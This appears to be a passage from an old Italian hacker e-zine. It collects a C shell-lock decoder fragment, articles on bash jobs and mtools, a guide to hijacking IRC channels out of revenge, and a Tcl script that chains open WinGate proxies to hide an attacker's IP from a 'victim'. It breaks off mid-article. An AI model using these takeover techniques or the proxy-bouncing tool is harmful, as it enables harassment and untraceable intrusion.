  
  while ((c = getopt(argc, argv, "cdhi:o:s:")) != EOF){
    switch (c) {
      case 'c':
        cryptFlag++;
        break;
      case 'd':
        decryptFlag++;
        break;
      case 'i':
        infile = optarg;
        break;
      case 'o':
        outfile = optarg;
        break;
      case 's':
        seekOffset = atoi(optarg);
        break;
      case 'h':
        usage(argv[0]);
        break;
      default:
        usage(argv[0]);
        break;
    }
  }
      
  if ((cryptFlag && decryptFlag) || (!cryptFlag && !decryptFlag)){
    printf("Must specify either -c or -d but not both\n");
    usage(argv[0]);
  }

  if (infile){
    fdin = open(infile, O_RDONLY);
    if (fdin == -1){
      perror("open infile");
    }
  } else {
    fdin = STDIN_FILENO;
  }

  if (outfile){
    fdout = open(outfile, O_WRONLY|O_CREAT|O_EXCL, 0644);
    if (fdout == -1){
      perror("open outfiel");
    }
  } else {
    fdout = STDOUT_FILENO;
  }

  memset(inbuff, '\0', sizeof(inbuff));
  memset(outbuff, '\0', sizeof(outbuff));

  if (decryptFlag)
    lseek(fdin, seekOffset, SEEK_SET);

  while ((strlen = read(fdin, inbuff, sizeof(inbuff))) != 0){

    for (i=0; i < strlen ; i++){
      if (cryptFlag){
        if (!(i % 2))
          outbuff[i] = (inbuff[i] + 0x44) & 0xff;
        else
          outbuff[i] = (inbuff[i] + 0x63) & 0xff;
      } else {
        if (!(i % 2))
          outbuff[i] = inbuff[i] - 0x44;
        else
          outbuff[i] = inbuff[i] - 0x63;
      }
    }

    write(fdout, outbuff, strlen);
  }

  close(fdin);
  close(fdout);

  return(0);
} 

void usage(char *progname){

  char *c;
 
  c = strrchr(progname, '/');
  if (c)
    c++;
  else
    c = progname;

  printf("Usage: %s -cd[h] [-i infile] [-o outfile] [-s seek] \n", c);
  printf("  Shell-lock {en,de}coder by mudge@l0pht.com and _lumpy\n");
  printf("    -c  encrypt\n");
  printf("    -d  decrypt\n");
  printf("    -h  help\n");
  printf("    -i <file> input file\n");
  printf("    -o <file> output file\n");
  printf("    -s <offset> seed offset [defaults to 50688]\n");
  exit(1);
}

---end codem.c---

|_|R|<3S for special grant of BooZed ToXin
mail: urkes@hotmail.com

ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ

                         ֹֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ»
                         ÷ִִִִִִִִִִִִִִִִִִִִ¿÷
                         ÷³    JOB DI SHELL    ³÷
                         ÷ְִִִִִִִִִִִִִִִִִִִִ÷
                         ָֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ¼

(premetto che non sono un geniaccio di linux, ma ci Lavoro parecchio) ;)

Attraverso alcune shell e' possibile gestire i job (molte persone non sanno
neanche cosa cazzo siano) , in questo caso rappresentano raggruppamenti di
processi generati da un unico comando.

La shell Bash, e in generale le shell POSIX, oltre alla shell Korn e alla
shell C, gestiscono i job. 
Nelle sezioni seguenti si fa riferimento al comportamento di Bash (in qualita'
di shell POSIX), ma la maggior parte di quanto spiegato in queste sezioni
vale anche per le shell Korn e C (ksh e csh). 

-- Il Job di shell non e' assolutamente confondibile con un processo.
   Il processo e' un singolo eseguibile in funzione, e cui a sua volta possono
   essere associati altri processi.
   Un job di shell rappresenta tutti i processi che vengono generati da un
   comando impartito tramite la shell stessa ---

Foreground e background di Job.

L'attivita' di un job puo' avvenire in primo piano (foreground) o sullo sfondo
(background). Nel primo caso, il job impegna la shell e quindi anche il
terminale, mentre nel secondo la shell e' libera da impegni e cosi' anche il
terminale.

AVVIO DI JOB SULLO SFONDO.

Un programma e' avviato esplicitamente come job sullo sfondo quando alla fine
della riga di comando viene aggiunto il simbolo "&". Per esempio:

 # make zImage > ~/make.msg &

che avvia sullo sfondo il comando make zImage, per generare un kernel,
dirigendo lo standard output verso un file per un possibile controllo
successivo dell'esito della compilazione.

A sua volta dopo l'avvio di un programma come Job sullo sfondo, la shell da
una riga contenente il numero del Job stesso, ed il numero del processo
terminale dato dallo stesso job (Pid).
es:     [1] 153 (che rappresenta il Job n.1 con pid 153)

ha la necessita' di emettere dati attraverso lo standard output o lo standard
error e non sono stati ridiretti si ottiene :
es:     [1]+ Stopped (tty output) cazz (il job avviato con il comando cazz si
                                        e' bloccato in attesa di poter emettere
                                        dell'output)

SOSPENZIONE DELLO JOB.

Se volete sospendere un Job in esecuzione nell'es. precedente il Job (cazz),
basta digitare il comando "susp" o brevemente (ctrl+z) , se il Job verra'
sospeso la shell rispondera' con:
es:     [1]+ Stopped cazz      (job cazz e' sospeso) .

-------JOBS-------

usage: jobs [<opzioni>] [<job>]

Il comando di shell jobs, permette di conoscere l'elenco dei job esistenti
e il loro stato.

Per eseguire questo comando occorre che non vi siano altri job in esecuzione
in primo piano, e si otterranno l'elenco dei job sullo sfondo.

 opzioni:       -l : Che permette i numeri Pid dei processi di ogni Job.
                -p : Che emette solo i numeri PiD di ogni Job.

Esempi:

# jobs
           [1]   Running                 yes >/dev/null &
           [2]-  Stopped (tty output)    netc
           [3]+  Stopped (tty input)     Mul

# jobs -p 
232
233
235       (numeri PID dei processi leader di ogni job) :)

Simbolo  Descrizione  

%n  Il job con il numero indicato dalla lettera n.  
%<stringa>  Il job il cui comando inizia con la stringa indicata.  
%?<stringa>  Il job il cui comando contiene la stringa indicata.  
%%  Il job attuale.  
%+  Il job attuale.  
%-  Il job precedente a quello attuale .

 fg [<job>] --

 Con il seguente comando si ottiene il job che prima era sullo sfondo.
 se non viene specificato alcun Job su cui agire si intende quello attuale.

 bg [<job>] 

Il comando bg permette di fare riprendere (sullo sfondo) l'esecuzione di un
job sospeso.

KILL

kill [-s <segnale> | -<segnale>] [<job>]

es.
# kill -KILL %1
 Elimina i processi abbinati al job n.1 emettendo il segnale di SIGKILL.

# kill -9 %1
Elimina i processi abbinati al job n.1 emettendo il segnale in forma numerica.

Ho provato ad esplicare quelle 4 stronzate che ho memorizzato e non ricordo
teoricamente. Spero che a qcn possa servire. In effetti non credo tutti
abbiano per passione linux, ma chi ha questo sys nel sangue .. sono sicuro
apprezzera' queste 4 righe.

uhm..
=)

cmq.. ringrazio gli amici NewBie che mi sollevano spesso moralmente, in
particolare Nobody88 e guf0z, i dislessici (LordFelix, sprintf, awgn), ed
i miei amici pizzari. ;o)

Pizzahack.org /\_/\The H0ly LinuX/\_/\              rwxrw-r-x ---> shark

ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ

          ֹֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ»
          ÷ִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִ¿÷
          ÷³   MTOOLS OVVERO COME VIVERE IN DOS SOTTO LINUX ;)   ³÷
          ÷ְִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִ÷
          ָֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ¼

Salve a tutti, io sono N0bodY88 e questo articolo trattera' di un pacchetto
di programmi forse non molto noto ma molto utile se avete poco tempo e dovete
salvare qualcosa su dischetto dalla vs linux box :)
Ma prima di tutto cos'e' Mtools?
Mtools puo' essere definito come un pacchetto installabile sui ns neo-nati
linuzzi, che cosiste in un insieme di programmi che si possono utilizzare
per gestire i dischetti in formato ms-dos (sisisi quelli di winzoz ;).
Ma xche' sbatterci a imparare a usare sti mtools se x formattare un dischetto
basta eseguire queste poche e semplici operazioni:

1) setfdprm -p /dev/fd0 1440/1440
2) fdformat /dev/fd0
3) mke2fs -c -v -L "Nobo" /dev/fd0
4) mount -t ext2 /dev/fd0 /mnt/floppy

=====)))))
Voi mi potreste dire...basta che metti tutto in un bello scriptino fatto
apposta...e io vi direi..ok avete ragione voi :P hihihi
A parte gli scherzi il pacchetto Mtools viene usato x tre motivi:

1) vi formatta un dischetto in 3 secondi (che non e' male x chi va di fretta!)
2) il dischetto che create (e relativi file contenutivi) saranno perfettamente
   visibili sui winzozzi dei ns amici (o del ns)
3) i comandi x fare tutto cio' sono della cagate assurde (...speravate che
   vi insegnassi qualcosa di tosto? invece no :ppppp hihihi)

Ora andiamo a vedere in dettaglio i vari programmi di Mtools (pacchetto che
trovate nella installazione di Red Hat e SuSE e nelle altre non so xche' non
le ho ancora messe ;):

COME FORMATTARE IL DISCHETTO CONTENUTO NELL'UNITA' A: ?

Semplice basta fare da shell:                           # mformat a:

a due punti!?!?!?(direte voi) Ma non siamo in linux???? Ebbene si' ma gli
mtools fanno proprio tornare in mente i (vecchi ma ancora molto utili se li
si sa ;) comandi dos.

E X DARE UN ETICHETTA AL NS DISCHETTO ?                 # mlabel a:

E X COPIARE UN FILE (DELLA DIR CORRENTE) SU DISCHETTO ? # mcopy nobo.txt a:

E X COPIARE UN FILE NELLA DIR CORRENTE DAL DISCHETTO ?  # mcopy a: nobo.txt
                                                       
E X CANCELLARE UNO FILE SUL DISCHETTO ?                 # mdel a:*.txt

E X ENTRARE IN UNA DIRECTORY NEL DISCHETTO ?            # mcd a:/appunti

E X CANCELLARE UNA INTERA DIRECTORY ?                   # mdeltree a:/appunti

E X CREARE UNA DIRECTORY ?                              # mmd a:/newbies

E X CANCELLARE UNA DIRECTORY (VUOTA STAVOLTA) ?         # mrd a:/newbies

E X LEGGERE IL CONTENUTO DI UNO DEI FILE SU DISCHETTO ? # mtype -t a:/newbies5

ma come mai quella opzione -t???? Quel parametro serve a dire al ns linuzzo
che noi si sta a guarda un file del cugino dosss e che quindi ci sono da
convertire tutti gli "a capo". Se plu fasil ;) (da qui potete capire che non
ho fatto il liceo linguistico =)
Che mi rimane da dire? Beh, sperando che questo art possa essere stato d'aiuto
anke ad uno solo di voi (anke se 2 sarebbe + gratificante ;) vi saluto e vi
lascio ad altri art sicuramente + degni di ricevere attenzione di questo ===)

Byez                                                       N0bodY88

                                                "Have u ever had a dream
                                                 or your life is just a trip
                                                 a trip without changes..."
                                                 GUANO APES, Open Your Eyes

PS: solo dopo aver fatto l'articolo mi sono accorto che c'era un intero
    capitolo negli appunti di linux quindi se volete approfondire meglio
    l'argomento m-tools puntate i browser a http://pluto.linux.it e cercate
    nella miriade di informazioni note sotto il nome di appunti linux...
    da non perdere x chi come me ancora non mastika molto linux :)

ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ
²°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°²
²°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°²
²°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°²
²°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°²
²°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°²
ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ

$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
==============================================================================
 _____    ______    ______      ___   ___    ______    ______    __    ___
|     |  |      \  |      |    |   | |   |  /      \  |      |  |  |  /  /
|     |  |  O   |  |   ___|    |   | |   | |        | |   ___|  |  | /  /
|     |  |     /   |  |        |   |_|   | |   __   | |  |      |  |/  /
|     |  |     \   |  |___     |    _    | |  /  \  | |  |___   |  |\  \
|     |  |      |  |      |    |   | |   | | |____| | |      |  |  | \  \
|_____|  |__|\__/  |______|    |___| |___| |_|    |_| |______|  |__|  \__\

==============================================================================
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

DISCLAIMER:			
Il testo che segue e' puramente a scopo informativo, l'autore Th3_1n7rud3r
non si ritiene responsabile per l'uso che farete per le infoz qua sotto.
Soprattutto ricordatevi: IO NON C'ERO , NON SO NIENTE, NON HO VISTO NIENTE
E SE C'ERO STAVO TROMBANDO !!! :)))))

Adenguandomi allo stile del mitico pIGpEN  di BfI:

CONSUMO: te' freddo lipton al limone, patatine e 
	 merendine varie;
MUSICA ASCOLTATA: hardcore (Tunz Power !!!) :)
DEDICHE: al mio grande amico Bug Gates e al suo
	 winkaz;
ALTRE INFO: per non fare il lamerazzo del cut&paste,
            premetto che cio' che e' scritto di seguito
            e' per 40 % mio e per il 60 % tradotto da
	    "Hacking IRC - The Definitive Guide" scritto
	    da un certo klider (klider@panix.com);

//////////////////////////*************************\\\\\\\\\\\\\\\\\\\\\\\\\\\

Let the fun begin ! Ovvero come divertirsi alle spalle di quei lamerazzi
che si definiscono grandi hacker solo perche' hanno uno script pieno di
nuke e sanno come usare altavista !

PERCHE' HACKERARE UN CHAN IRC ?

La domanda ha mille risposte, uno dei motivi potrebbe essere il volere
buttare fuori quel pirla che ci ha offeso il giorno prima oppure una molto
piu' semplice vendetta versio qualcuno che ci sta sul ca**o.

DI COSA AVETE BISOGNO

La prima cosa che avrete bisogno (anche se non e' indespensabile) e' una
shell *NIX, perche' vi permette di fare tante belle cose che non potete
fare col il nostro amato Winkaz. Inoltre una script per la shell e' molto
piu' veloce dei vari scripts mIRC like ( avendo sperimentato entrambi posso
confermare che e' davvero meglio la shell: Linux Power !!!!!!).
Oltre a cio' avrete bisogno di alcuni tools che si trovano in tutti i siti
h/c/p/v e cioe':
- Link Looker: un piccolo proggyz che ci sara' molto utile e ci serve per
sapere quali server sono splittati (ve lo spiego dopo... )
-Multi Collide Bot (MCB): un altro piccolo proggyz che ci servira' per
buttare fuori gli OP (se non sapete cosa vuol dire essere OP e' meglio che
tornate a cose piu' semplici come accendere e spegnere un computer... :) )

ALCUNE TECNICHE PER IMPADRONIRSI DI UN CANALE

La prima cosa, anche se puo' sembrare ovvia e stupida, e' quella di fare un
po' di social engineering e cioe' andare per qualche sera nel can e cercare
di farsi amici gli operatori cosi' saranno poi loro a darvi l'@ e in
cambio, per dimostrare quanto siete bastar.... volevo dire educati, gli
ciuccerete il suo bel canalino !
Se non avete voglia di perdere tempo e volete vendetta subito potete
ricorrere alla tecnica del server splittato. Mi spiego: un server si dice
splittato quando e' "staccato" da una parte della rete. Ora, quando questo
accade, e siete i soli nel canale splittato, avete l'opportunita' di
prendervi automaticamente l'@ quando il server si ricollega alle rete.
Per attuare questa tecnica ecco che entra in gioco il Link Looker. Questo
piccolo programmino agisce come il vostro agente segreto e vi informa se
il server che sta controllando splitta dalla rete, in poche parole vi
risparmia tutta la fatica di monitorare "a mano" un server per tutta la
sessione. Il metodo dei server splittati funziona solo con quei canali
piccoli o cmq con quelli gestiti da gente poco esperta. La maggior parte
delle volte infatti a proteggere i canali ci sono dei Bot, dei programmi
che decidono chi deve essere operatore e chi no e che vi deopperebbero
subito. Contro questi bastardi entra in gioco il Multi Collide Bot, un
potente tool e anche il vostro miglior amico !!!
L'MCB sfrutta il fatto che se create un clone di qualcuno su un server
splittato quando questo si ricollega alla rete si trova con due persone
con nick uguali e li sbatte fuori entrambi facendogli perdere l'@. Capito
il trucco ? Voi cacciate giu' l'OPerator e vi collegate dal server
splittato e sarete il solo @ nel canale.
Come ultima tecnica vi posso rimandare all'articolo che era su NewBies2 a
riguardo della registrazione di un canale con il Chanserv. Infatti se gli
operatori sono cosi' stupidi da non aver ancora registrato il canale voi lo
farete al posto loro e setterete tutto per essere i soli @ del canale.

COSA DA FARE PRIMA DEL TAKE-OVER

Prima di impadronirvi di un canale vi consiglio di stare a guardare per un
po', magari con un altro nick, quello che succede in modo da capire chi
sono gli OP abituali del canale.

COSE DA FARE DOPO ESSERSI IMPADRONITI DEL CANALE

Su questo punto vi posso dire solo una cosa: usate la fantasia  !!!!!!!!!

e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'e'

Bene per questa volta e' tutto, spero che abbiate capito almeno le basi
dell'hacking di IRC, se ci siete riusciti nonostante il mio pessimo
italiano siete davvero bravi !!!!! :))))))))))))))

Per qualsiasi cosa mailatemi a the1n7rud3r@freemail.it
ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ

               ֹֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ»
               ÷ִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִ¿÷
               ÷³              SCRIPT PER MIRC                ÷³ 
               ÷³         (PER L'UTILIZZZO DI UN BOT)         ³÷
               ÷ְִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִ÷
               ָֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ¼

Cari ragazzi ho deciso dopo aver visto alcuni bot settati male ad alcune
persone che non capivano il funzionamento dei bot di scrivere uno script da
implementare al vostro caro e bel mirc :):)
Questo script potete utilizzarlo direttamente sul vostro mirc originale
copiando lo script che segue nel file popups cancellando la parte che e'
inserita nel  [bpopup] e incollando questa, oppure immettendola direttamente
nello script che avete, cambiando naturalmente i vostri script. :)
Spero che vi piaccia e vi sia utile :)
Buona chattata a tutti
©÷°¨¨°÷©©÷°¨¨°÷©©÷°¨¨°÷©
    by XuNiL ^The Operative^ (MONNALISA TI AMOOOOO :):):)) piccola crisi :)
                                                      ©÷°¨¨°÷©©÷°¨¨°÷©©÷°¨¨°÷©

NOTA BY N0bodY88 = lo script x mirc di XuNiL abbiamo preferito metterlo tra
                   gli allegati col nome di scriptmirc.txt e poi zippato col
                   nome scriptmirc.zip x rendere meno corta la e-zine x tutti
                   i malati (come me) di mente che si stampano regolarmente
                   NewBies (ce ne sara' qualcun'altro oltre me? mah.........
                   misteri della vita ;-)

ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ
²°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°²
²°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°²
²°°°°°°°°°°°°°²²°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°²
²°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°²
²°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°²
ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ

NOTA BY N0bodY88 = come al solito questa sezione oltre ad articoli di hacking
                   vero e proprio contiene gli art piu' disparati sempre
                   attinenti all'argomento hacking quindi che dire ...
                   ... godeteveli :) ... e se vi sembra che un art dica cose
                   sbagliate o cmq poco giuste e volete dircelo allora
                   scrivete voi un art sull'argomento cosi' da aiutarci a
                   migliorare sia noi membri di NewBies sia i lettori che
                   magari sull'argomento non ne sanno molto e vanno in cerca
                   di qualcuno che gli spieghi qualcosa o meglio che lo
                   indirizzi verso la strada giusta...

ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ

----------------------------[WinGate With All 1.0]-----------------------------
-----------------------------------[|CyRaX|]-----------------------------------

Consumo: 1 pakketto di Diana Blu
         1 cucciolone (con 2 barzellette pietose)
         1 flauto al cioccolato
         1 coca cola

Musica Ascoltata: "Reflector God" "Minute of Decay" by Marilyn Manson
                  "Come as you are" by Nirvana
                  "Mi chiamano candy" by Carlotta (Ke canzone di merda)
                  
Thanks To: BlackBerry: Ti devo l'esistenza sulla grande rete..
           Mav : Sostegno morale
           e poi : LordGIO ^eagle1^ Peter_And ZZ_Top Frankj Queryme Belial
           Fuzzo Goemon Fda RedEvil Guy e il resto di #programmazione 
           e #simpson

Fucks To: I miei prof di Disegno Storia e Latino

Cominciamo....

A volte potrebbe essere utile non lasciare il nostro vero ip nessun log.. ma
non tutti i client supportano l'uso di sock, proxy o robe varie..
Escludendo i client irc ke permettono di mandare messaggi direttamente al
server ( /raw o /quote) non e' possibile usare i telnet proxy con un
qualsiasi client tcp. Per risolvere questo problema ho realizzato un
semplice programmino in tcl. Per tutti quelli ke in questo momento si sono
messi a cantare "No Scrubs" consiglio di fare un salto al sito della sun. (e
poi quelle sono tlc :)) . Il suo funzionamento e' semplicissimo... Basta
dargli come argomento un file contenente una lista di wingate, la porta dove
mettersi in listen, e ovviamente l'host e la porta del bersaglio. Poi
prendete il vostro client (per esempio un web browser o un client pop3) e
gli dite di connettersi al localhost sulla porta dove avete messo il
programmino in listen. Quindi il programmino si passera' tutti i wingate e
mettera' il vostro client in comunicazione con la vittima.
In questo modo non sara' il vostro ip a comparire al bersaglio ma quello
dell'ultimo wingate nella vostra lista.

Passiamo alle domande...

d) Funziona con tutti i telnet proxy ?

r) No.. Funziona solo con il telnet proxy del wingate... ovvero quelli ke
sulla 23 ti danno il prompt "Wingate>". A dire il vero funziona con tutti i
telnet proxy ke prima di metterti in comunicazione con l'host dato ti
mandano 2 righe di testo. ( I wingate di danno il prompt + una riga di
conferma). La seconda riga mandata dal proxy viene mostrata dal programmino.
In questo modo, in caso di erorri, e' possibile quale wingate non funzia.

d) E se il mio client si connette solo su una porta predefinata ke non posso
cambiare ? (come molti client pop3)

r) In questo caso basta mettere il programmino in listen sulla porta ke il
client vuole.. Se quella porta e' gia in uso da qualche altro programma
dovete chiuderlo (oppure rinunciare :)

d) Ma perke' l'hai fatto in tcl ???

r) Perke' il tcl e' un linguaggio + semplice del c e xke' non so usare molto
bene quest'ultimo e dato ke devo studiare per passare 3 fottuti debiti
formativi (vedi sezione fucks to) non ho molto tempo di impararlo. 


d) Uahoooo. E con questo posso provare tutti i miei exploit su www.fbi.gov
con la certezza ke non riuscirranno mai a rintracciarmi ??

r) ASSOLUTAMENTE NO! I wingate per default non loggano ma non potete esserne
certi. Questo programmino permette di passare per quanti wingate volete ma
in ogni caso la sicurezza non e' certa. 
Guardiamo la sicurezza ke possiamo avere in vari casi...

1)Se tutti i wingate per cui passate loggano possono risalire a voi senza
troppi problemi (certo.. + ne usate + ci mettono).

2)Se almeno un wingate non logga il bersaglio non puo' risalire a voi andando
a trovare tutti i proprietari di wingate. Comunque ricordate ke se il primo
wingate logga e se l'admin vede ke avete rimbalzato su fbi.gov potrebbe
sempre avvisare lui l'admin del sito.

3)Se il primo wingate non logga siete al sicuro.. Il vostro ip non e' stato
registrato quindi anke se un qualsiasi admin di un qualsiasi wingate vede ke
qualcuno e' rimbalzato sull'fbi nemmeno lui puo' risalire a voi.


Se passate da un bel po' di wingate la prima ipotesi e' improbabile. La
seconda e' ank'essa improbabile.. anke xke' i wingate ke vedendo dove
rimbalazate possono risalire a voi sono quelli ke vanno dal primo a cui vi
collegate al primo ke non logga.

Tutto questo casino per farvi capire ke non potete essere certi di essere
invisibili. 

Vabbuo'... ekkovi il codice... non l'ho testato molto...
report sui bug, insulti e bestemmie a cyrax@freemail.it
(per ki se lo dimenticasse : chmod+x wgwa.tcl)

-----------wgwa.tcl-----------
#! /usr/bin/tclsh

if {[llength $argv] != 4} {
        puts "WinGate With All 1.0"
        puts "Wroted by |CyRaX|"
        puts "Usage : ./wgwa.tcl wingatefile listenport targethost targetport"
        puts "Then run your client and connect him to localhost/localport"
        exit
}
# Getting args from the command line
set wingatefile [lindex $argv 0]
set listenport [lindex $argv 1]
set targethost [lindex $argv 2]
set targetport [lindex $argv 3]

#Proc that bounce all the wingates
proc bounce {channel address clienport} {
        global wingatefile
        global listenport
        global targethost
        global targetport       
        set wgfile [open $wingatefile r]
        # Connecting to the first wingate in the list
        set wgsock [socket [gets $wgfile] 23]
        while { [eof $wgfile] == 0} {
                set line [gets $wgfile]
                if {$line == ""} {break}
                puts $wgsock $line
                flush $wgsock
                # Gets the line with the prompt
                gets $wgsock
                # Show the line that confirm the connection
                puts [gets $wgsock]
        }
        # Now we must connect to the victim
        puts $wgsock "$targethost $targetport"
        flush $wgsock
        gets $wgsock
        puts [gets $wgsock]
        # Victim reached... now we make a pipe..
        fileevent $wgsock readable "give $wgsock $channel"
        fileevent $channel readable "give $channel $wgsock"
        }

proc give {from to} {
        puts $to [gets $from]
        flush $to
}

socket -server bounce $listenport
vwait closed
---------------------------
ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ

Titolo: X.25 for fun and profits, but much more for fun...
Autore: L0rD`n0p1
Azioni speciali: Induzione al suicidio di massa ed all'uso di droghe
                 pesantemente chimiche di molti miei conoscenti tra cui il
                 mio criceto che ora si fa di mescalina e sniffa
                 l'etere...
Consumo:
Ringraziamenti: Vecna, che e' il mio manuale di c
		Nail`d0d, ci vediamo ad AL il 30 :D
		Bikappa, we'll be rotting ya
		fla, flanculo !
		naif, ce vediamo ar seclab :D e te offro la colazione
                nhaima, :**
                o2,Smilzo,alt^255,Ego^pFe,SLIVER',B_Berry,/spirit/,
                |TsUnaMi|,N0body88,e tutti quelli che ho dimenticato :D
		Tutti gli host della mia rete, ma soprattutto quel gran
                server dedicato alla donna che piu amo :D
		Tutti quelli che ho dimenticato :)

DISCLAIMER
----------

Quello descritto in questo articolo potrebbe essere usato per scopi illegali, sottolineo che non e' questo lo scopo con
cui e' stato scritto quanto segue. Se intendete utilizzare quanto qui riportato per violare sistemi e cose simili
cancellate immediatemente questo file e andate a suicidarvi.

INTRO
-----

Non molta gente della nuova scena conoscera' la gloriosa rete che non
morira' mai, la cosidetta X.25 ovvero rete a commutazione di pacchetto.
Come fare a dimenticarsi della mitica ITAPAC, che fu una delle mie prime
dimore dei miei smanicamenti giovanili.
Come dimenticare il giorno in cui accedetti a ITAPAC e ne rimasi
totalmente affascinato, allora quando il modem piu' veloce era un 2400 e i
9600 erano lontanissimi sogni.
Ma lasciamo stare i ricordi e passiamo alle cose concrete.

THAT's aMMoRE (reti a commutazione di pacchetto)
-------------

La rete a commutazione di pacchetto e' caratterizzata dal fatto che e'
ibrida, ovvero permette connessioni chiunque con chiunque. 
Mi spieghero' meglio, quando i dati vengono inviati nella rete non
possiamo sapere il percorso che verra' fatto da essi ne dal sorgente al
destinatario e viceversa.
Infatti i dati originati vengono divisi in piccoli pacchetti
contrassegnati da un numero sequenziale e dall'indirizzo di destinazione,
e i pacchetti quando percorrono il percorso tra HOST originario (src) e
HOST destinatario (dst) essi intraprenderanno il miglior percorso
disponibile al momento. Ciascuno dei pacchetti emessi da src quindi
viaggiera' per proprio conto e su diverse strade a secondo del percoso
migliore disponibile al momento.
Per usare un termine "straniero" questa e' una tecnica molto "reliable"
ovvero se un collegamento si interrompe durante la trasmissione dei dati e
uno o piu pacchetti non arrivano a dst non sara' necessario ritrasmettere
tutti i dati ma solo i pacchetti mancanti all'appello, poiche' sicuramente
altri pacchetti avranno trovato una strada alternativa al collegamento
interrotto.
A dst i pacchetti arriveranno in ordine casuale. Ma dato che ogni
pacchetto e' contrassegnato da un numero sequenziale non sara' affatto
